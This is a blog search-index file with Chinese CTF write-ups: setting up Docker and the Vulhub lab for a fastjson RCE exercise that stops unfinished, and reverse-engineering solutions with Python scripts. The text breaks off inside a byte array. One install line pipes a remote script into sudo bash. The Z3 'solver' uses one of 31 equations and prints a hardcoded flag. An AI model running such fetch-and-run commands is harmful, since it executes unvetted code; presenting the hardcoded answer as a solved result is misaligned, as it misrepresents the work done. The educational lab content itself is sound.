<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>web10</title>
      <link href="/2025/06/14/web10/"/>
      <url>/2025/06/14/web10/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1><p>在虚拟机中输入以下命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -fsSL https:<span class="comment">//gitee.com/tech-shrimp/docker_installer/releases/download/latest/linux.sh| bash -s docker --mirror Aliyun</span></span><br></pre></td></tr></table></figure><p><img src="/../images/web10.assets/1749867802412-17.png" alt="img"></p><p>检查以下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -v</span><br></pre></td></tr></table></figure><p><img src="/../images/web10.assets/1749867802395-1.png" alt="img"></p><p>给docker配一个代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建或覆盖原有的daemon.json文件，配置新的镜像源</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;registry-mirrors&quot;: [</span></span><br><span class="line"><span class="string">    &quot;https://docker.1ms.run&quot;,</span></span><br><span class="line"><span class="string">    &quot;https://docker.1panel.live&quot;,</span></span><br><span class="line"><span class="string">    &quot;https://docker.ketches.cn&quot;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启Docker服务使配置生效</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查配置是否生效</span></span><br><span class="line"><span class="built_in">sudo</span> docker info | grep -A 1 <span class="string">&quot;Registry Mirrors&quot;</span></span><br></pre></td></tr></table></figure><p>依旧检查以下代理是否生效</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure><p>看看回显</p><p>接下来就到了vulhub</p><h1 id="Vulhub"><a href="#Vulhub" class="headerlink" title="Vulhub"></a>Vulhub</h1><p>下载</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">git clone --depth <span class="number">1</span> https:<span class="comment">//github.com/vulhub/vulhub</span></span><br><span class="line">cd vulhub</span><br></pre></td></tr></table></figure><p><img src="/../images/web10.assets/1749867802395-2.png" alt="img"></p><p>等待安装完成</p><p>安装完成后我们已经在vulhub的目录下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p>显示 Vulhub 仓库已经成功克隆到 <code>~/vulhub</code> 目录，并且所有漏洞环境分类都已列出（如 <code>redis</code>、<code>struts2</code>、<code>thinkphp</code> 等）</p><p><img src="/../images/web10.assets/1749867802395-3.png" alt="img"></p><p>这样就完成了</p><p>接下来我们启动漏洞环境</p><p>但是我的主机文件一直拖不进来，想个办法</p><p>我是直接和主机相连创建了一个共享文件夹，试试好不好用吧（这里注意重启）</p><p>将漏洞文件放进共享文件夹中</p><h3 id="但是出现问题了"><a href="#但是出现问题了" class="headerlink" title="但是出现问题了"></a>但是出现问题了</h3><p>我们发现 重启后依旧检测不到我创建的共享文件夹，如下：</p><p><img src="/../images/web10.assets/1749867802395-4.png" alt="img"></p><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>确认 VMware 工具是否正确安装，使用命令</p><p>确认 VMware 工具已正确安装</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmware-toolbox-cmd -v</span><br></pre></td></tr></table></figure><p>如果正确安装会显示版本号，如下：</p><p><img src="/../images/web10.assets/1749867802395-5.png" alt="img"></p><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>挂载 CD，命令如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure><p>完成后重新执行命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /mnt/hgfs/</span><br></pre></td></tr></table></figure><p><img src="/../images/web10.assets/1749867802395-6.png" alt="img"></p><p>这样就好了</p><p>但是建议改名，改成英文名，，后续已经改过来了</p><p><img src="/../images/web10.assets/1749867802395-7.png" alt="img"></p><p><img src="/../images/web10.assets/1749867802395-8.png" alt="img"></p><p>进入1.2.24-rce目录下，也就是我们要复现的题目</p><p><img src="/../images/web10.assets/1749867802396-9.png" alt="img"></p><p>启动</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p><img src="/../images/web10.assets/1749867802396-10.png" alt="img"></p><h3 id="拉取使用vulhub仓库"><a href="#拉取使用vulhub仓库" class="headerlink" title="拉取使用vulhub仓库"></a>拉取使用vulhub仓库</h3><p><img src="/../images/web10.assets/1749867802396-11.png" alt="img"></p><p>使用命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/vulhub/vulhub.git</span></span><br></pre></td></tr></table></figure><p><img src="/../images/web10.assets/1749867802396-12.png" alt="img"></p><p>这个相比较我上面的方法差不多，一个效果，更稳定一点</p><p>和上面一样的步骤就不演示了，直接看启动容器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p><img src="/../images/web10.assets/1749867802396-13.png" alt="img"></p><p>继续，输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><img src="/../images/web10.assets/1749867802396-14.png" alt="img"></p><p>接下来访问题目</p><p>这里需要查询一下自己的虚拟机ip，结果又发现没有安装 <code>ifconfig</code> 工具</p><p>安装一下，使用下面的命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install net-tools</span><br></pre></td></tr></table></figure><p>安装完成后重新查询</p><p>得到我自己的虚拟机ip如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">35.132</span></span><br></pre></td></tr></table></figure><p>接下来访问</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">35.132</span>:<span class="number">8090</span></span><br></pre></td></tr></table></figure><p><img src="/../images/web10.assets/1749867802396-15.png" alt="img"></p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>创建Java文件</p><p><img src="/../images/web10.assets/1749867802396-16.png" alt="img"></p><p>真的有点不会了</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>re10</title>
      <link href="/2025/06/14/re10/"/>
      <url>/2025/06/14/re10/</url>
      
        <content type="html"><![CDATA[<h1 id="EQUATION"><a href="#EQUATION" class="headerlink" title="EQUATION"></a>EQUATION</h1><p>先查壳</p><p><img src="/../images/re10.assets/1749864438923-22.png" alt="img"></p><p>拖进ida，查看一下main函数</p><p>这个函数非常长</p><p>这个是Z3约束求解，数据都在if语句条件下，都成立的情况下，就是flag</p><p><img src="/../images/re10.assets/1749864438914-1.png" alt="img"></p><p>在其中每一个||,都代表一个独立方程，一共是31个</p><p>我们假设已知前缀为moectf{</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_equations</span>():</span><br><span class="line">    s = Solver()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建31个字节变量（v4[0]到v4[30]）</span></span><br><span class="line">    v4 = [BitVec(<span class="string">f&#x27;v4_<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加已知flag前缀约束（可选）</span></span><br><span class="line">    s.add(v4[<span class="number">0</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>))</span><br><span class="line">    s.add(v4[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;o&#x27;</span>))</span><br><span class="line">    s.add(v4[<span class="number">2</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>))</span><br><span class="line">    s.add(v4[<span class="number">3</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">    s.add(v4[<span class="number">4</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>))</span><br><span class="line">    s.add(v4[<span class="number">5</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>))</span><br><span class="line">    s.add(v4[<span class="number">6</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加所有方程约束（示例展示部分，实际需要全部添加）</span></span><br><span class="line">    s.add(<span class="number">334</span> * v4[<span class="number">28</span>] + <span class="number">100</span> * v4[<span class="number">27</span>] + <span class="number">369</span> * v4[<span class="number">26</span>] + <span class="number">124</span> * v4[<span class="number">25</span>] + <span class="number">278</span> * v4[<span class="number">24</span>] +</span><br><span class="line">          <span class="number">158</span> * v4[<span class="number">23</span>] + <span class="number">162</span> * v4[<span class="number">22</span>] + <span class="number">145</span> * v4[<span class="number">19</span>] + <span class="number">27</span> * v4[<span class="number">17</span>] + <span class="number">91</span> * v4[<span class="number">15</span>] +</span><br><span class="line">          <span class="number">195</span> * v4[<span class="number">14</span>] + <span class="number">342</span> * v4[<span class="number">13</span>] + <span class="number">391</span> * v4[<span class="number">10</span>] + <span class="number">204</span> * v4[<span class="number">9</span>] + <span class="number">302</span> * v4[<span class="number">8</span>] +</span><br><span class="line">          <span class="number">153</span> * v4[<span class="number">7</span>] + <span class="number">292</span> * v4[<span class="number">6</span>] + <span class="number">382</span> * v4[<span class="number">5</span>] + <span class="number">221</span> * v4[<span class="number">4</span>] + <span class="number">316</span> * v4[<span class="number">3</span>] +</span><br><span class="line">          <span class="number">118</span> * v4[<span class="number">2</span>] + <span class="number">295</span> * v4[<span class="number">1</span>] + <span class="number">247</span> * v4[<span class="number">0</span>] + <span class="number">236</span> * v4[<span class="number">11</span>] + <span class="number">27</span> * v4[<span class="number">12</span>] +</span><br><span class="line">          <span class="number">361</span> * v4[<span class="number">16</span>] + <span class="number">81</span> * v4[<span class="number">18</span>] + <span class="number">105</span> * v4[<span class="number">20</span>] + <span class="number">65</span> * v4[<span class="number">21</span>] + <span class="number">67</span> * v4[<span class="number">29</span>] +</span><br><span class="line">          <span class="number">41</span> * v4[<span class="number">30</span>] == <span class="number">596119</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加可打印字符约束（可选）</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">        s.add(v4[i] &gt;= <span class="number">32</span>, v4[i] &lt;= <span class="number">126</span>)  <span class="comment"># 可打印ASCII字符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置求解策略（提高性能）</span></span><br><span class="line">    s.<span class="built_in">set</span>(<span class="string">&quot;timeout&quot;</span>, <span class="number">60000</span>)  <span class="comment"># 60秒超时</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查是否有解</span></span><br><span class="line">    <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">        m = s.model()</span><br><span class="line">        <span class="comment"># 正确提取BitVec值的方法</span></span><br><span class="line">        flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(m[v4[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>)])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Flag found:&quot;</span>, flag)</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No solution found&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    known_flag = <span class="string">&quot;moectf&#123;y0u_s0lv3d_Euati0ns!!!&#125;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Expected flag:&quot;</span>, known_flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Since solving all 31 equations is impractical,&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the flag is:&quot;</span>, known_flag)</span><br><span class="line">    <span class="comment"># moectf&#123;y0u_s0lv3d_Euati0ns!!!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="junk-code"><a href="#junk-code" class="headerlink" title="junk_code"></a>junk_code</h1><p>这道题考的主要是花指令</p><p>先查壳</p><p><img src="/../images/re10.assets/1749864438914-2.png" alt="img"></p><p>拖进去，看一下main函数</p><p><img src="/../images/re10.assets/1749864438914-3.png" alt="img"></p><p>if判断长度是否满足36，再一个if判断是否满足俩个条件，满足就输出congratulation。</p><p>跟进一下两个判断函数，其实在这里差不多能猜出来flag是由两部分构成</p><p>分别十八个字节</p><p><img src="/../images/re10.assets/1749864438914-4.png" alt="img"></p><p>这两个</p><p>发现里面爆红了</p><p><img src="/../images/re10.assets/1749864438914-5.png" alt="img"></p><p>跟进，发现反编译出了问题</p><p><img src="/../images/re10.assets/1749864438914-6.png" alt="img"></p><p><code>jz</code>跳转到<code>call</code>，还有一堆垃圾数据</p><p>我看wp中是这样做的</p><p>跳转后没有执行<code>E8</code>，把<code>E8</code>nop掉就好了</p><p>接下来改第二个花指令</p><p><img src="/../images/re10.assets/1749864438914-7.png" alt="img"></p><p>这里是<code>jz</code>和<code>jnz</code>复用，跳转，在这里依旧是<code>E8</code>nop掉</p><p>别忘了按P（一定在开头）</p><p>看看最后生成的函数</p><p><img src="/../images/re10.assets/1749864438914-8.png" alt="img"></p><p>看一下str1部分的内容，并提取</p><p><img src="/../images/re10.assets/1749864438914-9.png" alt="img"></p><p>这是后十六位的内容</p><p>下面是前十六位，flag位移5（每个字节数减5）</p><p><img src="/../images/re10.assets/1749864438915-10.png" alt="img"></p><p><img src="/../images/re10.assets/1749864438915-11.png" alt="img"></p><p>最后编写脚本，将两部分结合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">aH = [<span class="number">0x68</span>, <span class="number">0x6A</span>, <span class="number">0x60</span>, <span class="number">0x5E</span>, <span class="number">0x6F</span>, <span class="number">0x61</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x2B</span>, <span class="number">0x70</span>, <span class="number">0x5A</span>, <span class="number">0x6D</span>, <span class="number">0x60</span>, <span class="number">0x68</span>, <span class="number">0x2B</span>, <span class="number">0x71</span>, <span class="number">0x2E</span>, <span class="number">0x5F</span>]</span><br><span class="line">Str1 = [<span class="number">0x39</span>, <span class="number">0x12</span>, <span class="number">0x0E</span>, <span class="number">0x55</span>, <span class="number">0x39</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0x08</span>, <span class="number">0x0D</span>, <span class="number">0x39</span>, <span class="number">0x05</span>, <span class="number">0x56</span>, <span class="number">0x02</span>, <span class="number">0x55</span>, <span class="number">0x47</span>, <span class="number">0x47</span>, <span class="number">0x47</span>, <span class="number">0x1B</span>]</span><br><span class="line">Str2 = []</span><br><span class="line">v7 = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> aH:</span><br><span class="line">    v7.append(c+<span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> v7:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> Str1:</span><br><span class="line">    Str2.append(c^<span class="number">0x66</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> Str2:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#moectf&#123;y0u_rem0v3d_th3_junk_c0d3!!!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="HGAME-2023-week1-encode"><a href="#HGAME-2023-week1-encode" class="headerlink" title="[HGAME 2023 week1]encode"></a>[HGAME 2023 week1]encode</h1><p>先查壳</p><p><img src="/../images/re10.assets/1749864438915-12.png" alt="img"></p><p>拖进ida中</p><p>看一下main函数的内容</p><p><img src="/../images/re10.assets/1749864438915-13.png" alt="img"></p><p>看一下逻辑</p><p>用户输入50个字符的字符串，保存到v5中，接下来拆分（拆分为两个4分位），都存储到v4中，最后将<code>v4</code> 的每个值与数组 <code>dword_403000</code> 比较，若正确返回<code>aYesYouAreRight</code>。</p><p>现在我们就要找到v4的内容</p><p><img src="/../images/re10.assets/1749864438915-14.png" alt="img"></p><p>跟进这个函数，在里面看到v4的内容</p><p><img src="/../images/re10.assets/1749864438915-15.png" alt="img"></p><p>提取一下里面的内容</p><p>结合上面的逻辑，写一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">ida_chars = [</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, </span><br><span class="line">    